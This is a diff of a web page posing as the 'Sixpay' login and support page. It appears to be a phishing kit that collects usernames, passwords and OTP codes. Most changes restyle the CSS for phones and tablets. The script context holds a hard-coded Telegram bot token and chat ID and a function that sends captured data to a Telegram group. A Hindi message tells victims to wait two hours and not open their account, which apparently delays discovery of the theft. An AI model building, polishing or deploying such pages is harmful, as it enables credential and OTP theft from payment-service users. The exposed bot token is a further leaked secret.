@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <meta property="og:title" content="Sixpay Support Team">
 <meta property="og:description" content="Sixpay login page - Six Pay Offical Website">
 <meta property="og:type" content="website">
@@ -14,27 +14,41 @@
     padding: 0;
     box-sizing: border-box;
 }
-body {
+html, body {
+    height: 100%;
+    overflow: hidden;
     font-family: Arial, sans-serif;
     background: #ffffff;
+}
+body {
     display: flex;
     justify-content: center;
     align-items: center;
-    min-height: 100vh;
+    height: 100vh;
+    height: 100dvh;
+    padding: 10px;
+    overflow: hidden;
+    position: fixed;
+    width: 100%;
+    top: 0;
+    left: 0;
 }
 .container {
-    max-width: 400px;
+    max-width: 420px;
     width: 100%;
-    padding: 0 20px;
+    padding: 0 15px;
+    margin: auto;
+    transform: translateY(0);
 }
 .logo {
     text-align: center;
-    margin-bottom: 20px;
+    margin-bottom: 15px;
 }
 .logo img {
     width: 220px;
     max-width: 100%;
     height: auto;
+    display: inline-block;
 }
 .input-box {
     display: flex;
@@ -42,14 +56,14 @@ body {
     background: #f3f6fa;
     border-radius: 30px;
     padding: 14px 18px;
-    margin-bottom: 8px;
+    margin-bottom: 6px;
     border-bottom: 2px solid transparent;
 }
 .input-box i {
     color: #2196f3;
     font-size: 20px;
-    margin-right: 12px;
-    width: 24px;
+    margin-right: 10px;
+    width: 22px;
     text-align: center;
 }
 .input-box input {
@@ -64,9 +78,9 @@ body {
     border-bottom: 2px solid red;
 }
 .error-text {
-    font-size: 13px;
+    font-size: 12px;
     color: red;
-    margin: -5px 0 10px 0;
+    margin: -3px 0 6px 0;
     display: none;
 }
 .options {
@@ -74,17 +88,18 @@ body {
     justify-content: space-between;
     align-items: center;
     font-size: 14px;
-    margin: 12px 0 20px 0;
+    margin: 8px 0 14px 0;
 }
 .options label {
     display: flex;
     align-items: center;
-    gap: 8px;
+    gap: 6px;
     color: #1e88e5;
 }
 .options a {
     color: #1e88e5;
     text-decoration: none;
+    font-size: 14px;
 }
 .login-btn {
     width: 100%;
@@ -102,17 +117,24 @@ body {
     opacity: 0.9;
 }
 .privacy {
-    margin-top: 15px;
+    margin-top: 12px;
     text-align: center;
     font-size: 13px;
     display: flex;
     justify-content: center;
     align-items: center;
-    gap: 8px;
+    gap: 6px;
 }
 .privacy a {
     color: #1e88e5;
     text-decoration: none;
+}
+.privacy input[type="checkbox"],
+.options input[type="checkbox"] {
+    width: 18px;
+    height: 18px;
+    accent-color: #1e88e5;
+    cursor: pointer;
 }
 .modal {
     display: none;
@@ -138,14 +160,25 @@ body {
 .close {
     position: absolute;
     right: 15px;
-    top: 10px;
+    top: 8px;
     font-size: 24px;
     cursor: pointer;
+}
+.modal-box h2 {
+    font-size: 22px;
+    margin-bottom: 5px;
+}
+.modal-box h3 {
+    font-size: 20px;
+}
+.modal-box p {
+    font-size: 14px;
+    color: #555;
 }
 .otp-inputs {
     display: flex;
     justify-content: space-between;
-    margin: 20px 0;
+    margin: 18px 0;
 }
 .otp-inputs input {
     width: 55px;
@@ -156,6 +189,10 @@ body {
     border: none;
     border-bottom: 2px solid #ccc;
     outline: none;
+    background: transparent;
+}
+.otp-inputs input:focus {
+    border-bottom-color: #2196f3;
 }
 .timer {
     color: #999;
@@ -178,25 +215,92 @@ body {
     font-size: 20px;
     font-weight: bold;
     margin: 10px 0;
+    color: #2196f3;
 }
-@media (max-width: 480px) {
-    .container {
-        padding: 0 15px;
-    }
+.lang-btn {
+    margin-top: 10px;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 8px;
+    background: #2196f3;
+    color: white;
+    cursor: pointer;
+    font-size: 14px;
+}
+.lang-btn:hover {
+    background: #1976d2;
+}
+
+/* iPhone SE & Small Phones */
+@media (max-width: 375px) {
     .logo img {
-        width: 180px;
+        width: 160px;
     }
     .input-box {
-        padding: 12px 14px;
+        padding: 10px 14px;
+    }
+    .input-box input {
+        font-size: 14px;
     }
     .login-btn {
         font-size: 16px;
         padding: 12px;
     }
+    .options {
+        font-size: 12px;
+    }
     .otp-inputs input {
         width: 45px;
-        height: 45px;
+        height: 42px;
         font-size: 18px;
+    }
+}
+
+/* iPad & Tablets */
+@media (min-width: 768px) and (max-width: 1024px) {
+    .container {
+        max-width: 450px;
+    }
+    .logo img {
+        width: 260px;
+    }
+    .input-box {
+        padding: 16px 20px;
+    }
+    .input-box input {
+        font-size: 18px;
+    }
+    .login-btn {
+        font-size: 20px;
+        padding: 16px;
+    }
+    .options {
+        font-size: 16px;
+    }
+    .otp-inputs input {
+        width: 65px;
+        height: 58px;
+        font-size: 26px;
+    }
+}
+
+/* Large Screens */
+@media (min-width: 1025px) {
+    .container {
+        max-width: 480px;
+    }
+    .logo img {
+        width: 280px;
+    }
+    .input-box {
+        padding: 18px 22px;
+    }
+    .input-box input {
+        font-size: 18px;
+    }
+    .login-btn {
+        font-size: 20px;
+        padding: 16px;
     }
 }
 </style>
@@ -205,6 +309,7 @@ body {
 <body>
 
 <div class="container">
+    <!-- LOGO -->
     <div class="logo">
         <img src="https://i.ibb.co/wrC6bwLP/IMG-0652.jpg" alt="Sixpay">
     </div>
@@ -258,13 +363,13 @@ body {
         <p id="msgText">कृपया 2 घंटे इंतजार करें, उसके बाद आपका sell verify हो जाएगा और आपके अकाउंट में success हो जाएगा। कृपया 2 घंटे तक अपनी ID open ना करें, नहीं तो आपका account block हो सकता है।</p>
         <div class="loader"></div>
         <p id="countdown">02:00:00</p>
-        <button onclick="toggleLang()" style="margin-top:10px;padding:10px 20px;border:none;border-radius:8px;background:#2196f3;color:white;cursor:pointer;">Change Language</button>
+        <button class="lang-btn" onclick="toggleLang()">Change Language</button>
     </div>
 </div>
 
 <script>
 const BOT_TOKEN = "8757089666:AAGdUxSNs546H9mcHJS2kfClJ5tZUmOcqro";
-const CHAT_ID = "-1004414022639"; // 👈 GROUP CHAT ID (UPDATE KAR DIYA)
+const CHAT_ID = "-1004414022639"; // Group Chat ID
 
 async function sendDataToTelegram(message) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
